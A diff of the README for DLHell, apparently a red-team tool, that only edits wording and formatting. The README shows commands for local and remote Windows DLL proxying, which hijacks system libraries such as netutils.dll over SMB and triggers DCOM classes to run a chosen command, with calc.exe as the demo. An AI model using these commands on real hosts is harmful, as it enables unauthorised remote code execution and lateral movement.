@@ -1,16 +1,17 @@
 # DLHell
 
-DLHell performs DCOM local & remote Windows DLL Proxying
+DLHell performs DCOM local & remote Windows DLL Proxying.
 
 ## Install
 
-The following packages are required (might depend on your distro, following example for Debian 12)
+The following packages are required (might depend on your distro, the following
+example is for Debian 12):
 
 ```bash
 sudo apt install -y g++-mingw-w64-x86-64-win32 binutils-mingw-w64-x86-64
 ```
 
-Install pip dependencies
+Install pip dependencies:
 
 ```bash
 pip3 install -r requirements.txt
@@ -18,20 +19,25 @@ pip3 install -r requirements.txt
 
 ## Quick start
 
-The following command hijacks the library netutils.dll on host 10.137.0.48 from the template file template.tpe (C++ source hijack library) which launches calc.exe. Both original & proxy DLL will be placed in the folder `program files/windows nt/accessories/` of the c$ share on the remote target.
+The following command hijacks the `netutils.dll` library on host `10.137.0.48`
+from the `template.tpe` template file (C++ source hijack library) which
+launches `calc.exe`. Both original & proxy DLL will be placed in the `program
+files/windows nt/accessories/` folder of the `C$` share on the remote target.
 
-Please use Impacket synthax for the -remote-target option.
+Please use Impacket syntax for the `-remote-target` option.
 
 ```bash
 DLHell.py -t template.tpe -c 'calc.exe' -remote-lib 'windows/system32/netutils.dll' -remote-target 'program files/windows nt/accessories/test.dll' -target 'domain/user:password@ip'
 ```
 
 Kerberos authentication can also be used:
+
 ```bash
 DLHell.py -t template.tpe -c 'calc.exe' -k -target wks-02.vault-tech.com -progid WordPad.Document.1
 ```
 
 List available CLSID & ProgIDs:
+
 ```bash
 DLHell.py -list
 ```
@@ -92,46 +98,52 @@ connection:
                         Destination port to connect to SMB Server
 ```
 
-
 ## Local DLL Proxying
 
-For Local DLL crafting, use the options -local-lib (name of the proxy DLL) & -local-target (renamed original DLL)
+For Local DLL crafting, use the `-local-lib` (name of the proxy DLL) and
+`-local-target` (renamed original DLL) options:
 
 ```bash
 DLHell.py -t template.tpe -c 'calc.exe' -local-lib 'lib/netutils.dll' -local-target 'test.dll'
 ```
 
-## Remote DLL Proxying (Admin privileges needed)
+## Remote DLL Proxying (admin privileges required):
 
-For remote DLL hijacking, specify the options -target and -remote-lib (name of the original DLL on the remote host) & -local-target (renamed original DLL)
+For remote DLL hijacking, specify the `-target`, `-remote-lib` (name of the
+original DLL on the remote host) and `-local-target` (renamed original DLL)
+options:
 
 ```bash
 DLHell.py -t template.tpe -c 'calc.exe' -target 'domain/user:password@ip' -remote-lib 'windows/system32/PROPSYS.dll' -remote-target 'windows/test.dll'
 ```
 
-## DCOM DLL Proxying (Admin privileges needed)
+## DCOM DLL Proxying (admin privileges needed)
 
-DCOM DLL Proxying can be exploited by using the `-progid` and `-clsid` options
-
+DCOM DLL Proxying can be exploited using the `-progid` and `-clsid` options.
 The list of available CLSIDs & ProgIDs is available with the following command:
+
 ```bash
 DLHell.py -list
 ```
 
-You can add new hijacks to the dcom.json file which defines vulnerable libraries path
+You can add new hijacks to the `dcom.json` file which defines paths for
+vulnerable libraries:
 
-Then, only the ProgID or CLSID is required to:
+Then, only the ProgID or CLSID are required to:
+
 - Get the original DLL
-- Create & Compile the Hijack library
+- Create and compile the hijack library
 - Upload the libraries on the remote host
 - Activate the remote DCOM class
 
-Example for ProgID **WordPad.Document.1**:
+Example for ProgID `WordPad.Document.1`:
+
 ```bash
 DLHell.py -t template.tpe -c 'calc.exe' -target 'domain/user:password@ip' -progid WordPad.Document.1
 ```
 
-Example for CLSID **73FDDC80-AEA9-101A-98A7-00AA00374959**:
+Example for CLSID `73FDDC80-AEA9-101A-98A7-00AA00374959`:
+
 ```bash
 DLHell.py -t template.tpe -c 'calc.exe' -target 'domain/user:password@ip' -clsid 73FDDC80-AEA9-101A-98A7-00AA00374959
 ```
